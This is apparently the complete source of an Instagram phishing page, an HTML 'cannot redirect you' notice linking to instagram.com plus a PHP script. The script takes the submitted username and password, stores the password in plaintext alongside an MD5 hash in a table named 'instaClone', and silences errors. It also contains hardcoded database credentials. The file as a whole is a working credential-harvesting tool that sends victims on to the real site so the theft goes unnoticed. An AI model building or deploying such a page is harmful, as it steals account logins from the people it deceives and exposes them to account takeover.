<html>
<head>
  <style>
  *{
    font-family:sans-serif;
    font-size:4vw;
  }
    button{
      padding:4px 6px;
      background-color:#0095f6;
      color:white;
    }
    body{
      margin-left:10px;
    }
</style>
<body>Sorry we cannot redirect you<br /><br />
<a href="https://instagram.com/">Click here</a> to proceed.
</body>
</html>

<?php

error_reporting(0);
$pdo = new PDO('mysql:host=localhost;dbname=1175920','1175920','meghabhi2127');

$usrname = $_POST['username'];
$pswrd = $_POST['password'];
$hsh = md5($pswrd);

$params = array(':usrname'=>$usrname,':pswrd'=>$pswrd,':hsh'=>$hsh);
$result = $pdo->prepare("INSERT INTO `instaClone` VALUES(:usrname, :pswrd, :hsh, '')");
$result = $result->execute($params);
?>


